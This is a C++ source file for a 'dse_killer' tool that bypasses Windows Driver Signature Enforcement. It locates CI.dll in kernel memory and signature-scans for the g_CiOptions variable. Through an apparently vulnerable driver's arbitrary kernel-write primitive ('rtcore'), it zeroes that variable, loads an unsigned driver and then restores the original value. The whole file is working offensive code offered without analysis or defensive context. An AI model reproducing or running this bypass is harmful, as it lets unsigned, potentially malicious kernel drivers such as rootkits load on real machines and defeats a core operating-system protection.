#include "dse_killer.h"

void dse_killer::load_unsigned_driver(path driverPath)
{
	uintptr_t g_CiOptions_Offset = get_g_CiOptions_Offset();
	Log("The offset g_CiOptions is relative ImageBase for CI.dll 0x%llX", g_CiOptions_Offset);

	uintptr_t imageBaseCiInKernel = get_ci_image_base_in_kernel();
	Log("The kernel image base CI.dll 0x%016llX", imageBaseCiInKernel);

	uintptr_t pg_CiOptions_kernel = imageBaseCiInKernel + g_CiOptions_Offset;

	rtcore::init();
	DWORD oldValue{ 0 };
	rtcore::write_vm(pg_CiOptions_kernel, 0x0, 1, &oldValue);
	load_driver(driverPath);
	rtcore::write_vm(pg_CiOptions_kernel, oldValue, 1);
	rtcore::release();
	unload_driver(driverPath);
}

uintptr_t dse_killer::get_ci_image_base_in_kernel()
{
	ULONG size{ 0 };
	NTSTATUS ntstatus = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &size);

	PRTL_PROCESS_MODULES pProcessModules = (PRTL_PROCESS_MODULES)VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	ntstatus = NtQuerySystemInformation(SystemModuleInformation, pProcessModules, size, nullptr);
	CheckNtStatus(ntstatus);
	
	PRTL_PROCESS_MODULE_INFORMATION pModuleInfo = &pProcessModules->Modules[0];

	for (size_t i = 0; i < pProcessModules->NumberOfModules; i++, pModuleInfo++)
	{
		PCHAR szModuleName = (PCHAR)pModuleInfo->FullPathName + pModuleInfo->OffsetToFileName;

		if (memcmp(szModuleName, "CI.dll", 6) != 0)
			continue;
		
		uintptr_t ret = (uintptr_t)pModuleInfo->ImageBase;
		VirtualFree(pProcessModules, 0, MEM_RELEASE);
		return ret;
	}
	
	return 0;
}

// Get the offset g_CiOptions is relative ImageBase for CI.dll
uintptr_t dse_killer::get_g_CiOptions_Offset()
{
	uintptr_t pCiMap = map_ci_into_memory();
	uintptr_t pCiAuditImageForHvci = scanner::sig_scan_section("PAGE", (PIMAGE_DOS_HEADER)pCiMap, SIG_CI_OPTIONS, sizeof(SIG_CI_OPTIONS));

	if (!pCiAuditImageForHvci)
		LogError("g_CiOptions could not be found in mapped CI.dll!");

	DebugLog(".PAGE:CiAuditImageForHvci + 0x146 == 0x%016llX", pCiAuditImageForHvci);

	signed int offsetCiOptions = *(PDWORD)(pCiAuditImageForHvci + 2);
	uintptr_t absoluteCiOptions = offsetCiOptions + pCiAuditImageForHvci + 10;

	return absoluteCiOptions - pCiMap;
}

uintptr_t dse_killer::map_ci_into_memory()
{
	path fPath = get_system32_drivers_path().parent_path() / "ci.dll";

	HANDLE hFile = CreateFileW(fPath.c_str(),
		GENERIC_READ, 
		0, 
		nullptr, 
		OPEN_EXISTING, 
		0, 
		nullptr);
	CheckHandleEx(hFile, "%ls", fPath.c_str());

	HANDLE hSection = CreateFileMappingA(hFile,
		nullptr, 
		PAGE_READONLY | SEC_IMAGE, 
		0, 
		0, 
		nullptr);
	CheckHandle(hSection);

	PVOID pFileMap = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);

	CloseHandle(hSection);
	CloseHandle(hFile);

	DebugLog("CI.dll is successfully mapped! => 0x%p", pFileMap);
	return (uintptr_t)pFileMap;
}
